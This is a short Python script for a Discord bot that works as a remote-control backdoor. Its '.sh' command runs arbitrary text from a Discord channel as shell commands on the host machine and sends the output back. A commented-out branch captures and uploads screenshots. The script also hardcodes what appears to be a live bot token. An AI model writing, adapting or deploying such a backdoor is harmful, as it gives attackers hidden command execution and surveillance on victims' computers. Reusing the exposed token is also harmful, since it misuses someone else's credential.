#-*-coding: utf-8-*-
import discord
from discord.ext import commands
from os import chdir, getcwd
from subprocess import run, PIPE
from pyautogui import screenshot
from time import strftime

bot = commands.Bot(command_prefix=".")


@bot.event
async def on_ready():
	print("[+]Ready.")


@bot.command(name="sh")
async def sh(ctx, *args):
	if len(args) == 0:
		return 0
	command = " ".join(args)
	print("[+]Command sent: {}".format(command))
	if args[0] == "cd":
		try:
			chdir(args[1])
		except:
			pass
		finally:
			output = getcwd()	

	#elif args[0] == "screenshot":
	#	filename = "ss{}.jpg".format(strftime("%y%m%d%H%M%S"))
	#	screenshot(filename)
	#	await ctx.send(file=discord.File('{}\\{}'.format(getcwd(), filename)))
	#	run("del {}".format(filename), shell=True)
	#	return 1

	else:
		o = run(command, shell=True, stdout=PIPE, stderr=PIPE)
		output = o.stdout.decode("latin1") + o.stderr.decode("latin1")


	await ctx.send(output)




bot.run("Nzk4NDU3ODczOTYwOTI3MjUz.X_1T1w.Ru68vQhOyWQk6OJW6SjWX7yakUU")